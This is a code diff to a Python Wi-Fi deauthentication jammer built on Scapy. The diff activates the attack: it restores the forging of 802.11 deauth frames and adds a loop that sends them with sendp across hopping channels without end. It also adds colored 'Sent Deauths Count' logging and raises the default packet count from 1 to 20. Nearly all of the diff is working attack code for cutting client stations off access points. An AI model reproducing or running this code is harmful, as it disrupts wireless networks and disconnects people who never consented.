@@ -81,6 +81,25 @@ class JAMMER:
 
 		return retval
 
+	def get_ess(self, bss):
+		retval = ''
+
+		for ap in self.__ACCESSPOINTS:
+			if ap.get('bssid') == bss:
+				retval = ap.get('essid')
+				break
+
+		return retval
+
+	def get_channel(self, bss):
+		retval = 0
+
+		for ap in self.__ACCESSPOINTS:
+			if ap.get('bssid') == bss:
+				retval = ap.get('channel')
+
+		return retval
+
 	def filter_devices(self, sn, rc):
 		retval = {
 			'ap': '',
@@ -95,17 +114,7 @@ class JAMMER:
 				retval['ap'] = rc
 				retval['sta'] = sn
 
-		return retval
-
-	def get_channel(self, bss):
-		ch = 0
-
-		for ap in self.__ACCESSPOINTS:
-			if ap.get('bssid') == bss:
-				ch = ap.get('channel')
-				break
-
-		return ch				
+		return retval			
 
 	def clarify(self, toappend):
 		essid = toappend.get('essid')
@@ -154,7 +163,6 @@ class JAMMER:
 
 	def forge(self, ap, sta):
 		def fpkt(sn, rc):
-			print( "Code {}".format(self.code) )
 			pkt = RadioTap() / Dot11(
 				type=0, 
 				subtype=12,
@@ -231,6 +239,34 @@ class JAMMER:
 				if result.get('ap') and result.get('sta'):
 					self.filtertify(result.get('ap'), result.get('sta'))
 
+	def write(self, ap, sta):
+		if self.verbose:
+			pull.print("*",
+				"Sent Deauths Count [{count}] Code [{code}] ({sdeveloper}) {sender} <--> ({rdeveloper}) {receiver} ({essid}) [{channel}]".format(
+					count=pull.RED+str(self.packets)+pull.END,
+					code =pull.GREEN+str(self.code)+pull.END,
+					sender=pull.DARKCYAN+ap.upper()+pull.END,
+					receiver=pull.DARKCYAN+sta.upper()+pull.END,
+					sdeveloper=pull.PURPLE+pull.get_mac(ap)+pull.END,
+					rdeveloper=pull.PURPLE+pull.get_mac(sta)+pull.END,
+					essid=pull.YELLOW+self.get_ess(ap)+pull.END,
+					channel=pull.RED+str(self.get_channel(ap))+pull.END
+				),
+				pull.YELLOW
+			)
+		else:
+			pull.print("*",
+				"Sent Deauths Count [{count}] Code [{code}] {sender} <--> {receiver} ({essid}) [{channel}]".format(
+					count=pull.RED+str(self.packets)+pull.END,
+					code =pull.GREEN+str(self.code)+pull.END,
+					sender=pull.DARKCYAN+ap.upper()+pull.END,
+					receiver=pull.DARKCYAN+sta.upper()+pull.END,
+					essid=pull.YELLOW+self.get_ess(ap)+pull.END,
+					channel=pull.RED+str(self.get_channel(ap))+pull.END
+				),
+				pull.YELLOW
+			)
+
 	def jammer(self):
 		while True:
 			ch = random.choice(self.channel)
@@ -238,12 +274,17 @@ class JAMMER:
 			time.sleep(0.5)
 
 			crate = self.get_crate(ch)
+
 			for connection in crate:
 				ap = connection.get( 'ap' )
 				sta = connection.get( 'sta' )
 				channel = connection.get( 'channel' )
 
-				#pkts = self.forge(ap, sta)
+				pkts = self.forge(ap, sta)
+				for pkt in pkts:
+					sendp(pkt, iface=self.interface, count=self.packets, inter=self.delay, verbose=False)
+
+				self.write(ap, sta)
 
 			time.sleep(0.5)
 
@@ -297,7 +338,7 @@ class PARSER:
 			toloop = bssids.split(",")
 			for bssid in toloop:
 				if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", bssid):
-					retval.append(bssid)
+					retval.append(bssid.lower())
 
 		return retval
 
@@ -351,7 +392,7 @@ def main():
 	parser.add_argument('-s', '--stations'    , dest="stations", default="", type=str)
 	parser.add_argument('-f', '--filters'     , dest="filters" , default="", type=str)
 
-	parser.add_argument('-p', '--packets'     , dest="packets" , default=1 , type=int)
+	parser.add_argument('-p', '--packets'     , dest="packets" , default=20 , type=int)
 	parser.add_argument('-d', '--delay'       , dest="delay"   , default=0.1, type=int)
 	parser.add_argument('-r', '--reset'       , dest="reset"   , default=0  , type=int)
 	parser.add_argument('--code'              , dest="code"    , default=7  , type=int)
@@ -368,7 +409,7 @@ def main():
 		"IFACE [{interface}] CHANNEL [{channel}] VERBOSE [{verbose}]".format(
 			interface=pull.DARKCYAN+parser.interface+pull.END,
 			channel=pull.DARKCYAN+str(("HOP" if len(parser.channel) > 1 else parser.channel[0]))+pull.END,
-			verbose=pull.DARKCYAN+("True" if parser.verbose else "False")
+			verbose=pull.DARKCYAN+("True" if parser.verbose else "False")+pull.END
 		),
 		pull.DARKCYAN,
 	)
